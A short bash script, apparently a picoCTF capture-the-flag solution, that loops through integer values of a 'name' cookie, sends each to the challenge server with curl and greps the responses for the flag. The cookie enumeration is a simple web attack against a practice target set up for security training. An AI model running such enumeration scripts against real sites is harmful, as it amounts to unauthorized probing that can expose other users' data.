#!/bin/bash

# @BA_XX

echo "[*] Script running ..."

# picoCTF Cookie check 
URL="http://mercury.picoctf.net:21485/check"

I=0

while true; do 

	# send request with cookie 'name' using deferent values
	CONTENT=$( curl -s -b "name=$I" $URL )

	# search for flag in the content
	VALUE=$( echo $CONTENT | grep -o "picoCTF{[^ ]*}" )

	echo "curl -s -b \"name=$I\" $URL"; # just printing the command

	#check if the value not empty
	if [ "$VALUE" != "" ]; then 
		echo -e "YOUR FALG IS : \033[32m$VALUE\033[m" # print the flag
		break;
	fi

	I=$(( $I + 1 ))
done

